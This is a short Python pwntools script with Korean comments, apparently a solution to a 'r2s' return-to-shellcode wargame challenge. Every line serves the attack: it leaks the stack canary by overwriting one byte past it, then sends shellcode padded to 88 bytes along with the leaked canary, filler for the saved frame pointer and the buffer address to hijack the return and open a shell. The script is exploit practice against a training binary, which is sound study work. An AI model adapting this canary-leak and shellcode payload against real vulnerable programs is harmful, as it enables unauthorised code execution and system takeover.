from pwn import *  
context.log_level = 'debug'

p = process("./r2s")

context.arch = 'amd64'


p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1],16) #버프 주소


p.recvuntil(b'$rbp: ')
bufdis = int(p.recvline()[:-1]) #rbp와 버프 사이 거리
canary = bufdis - 8 #캐너리와 거리

payload = b'A' * (canary+1) #캐너리 유출 공격

p.sendafter(b'Input: ',payload) #보내고

p.recvuntil(payload)    #페이로드까지 받고

cnry = u64(b'\x00' + p.recvn(7)) #64비트로 캐너리 받기

sh = asm(shellcraft.sh())

exp = sh.ljust(88,b'A') + p64(cnry) + b'A'*8 +p64(buf)
#sfp잊지 말기 
p.sendafter(b'Input: ',exp)

p.interactive()

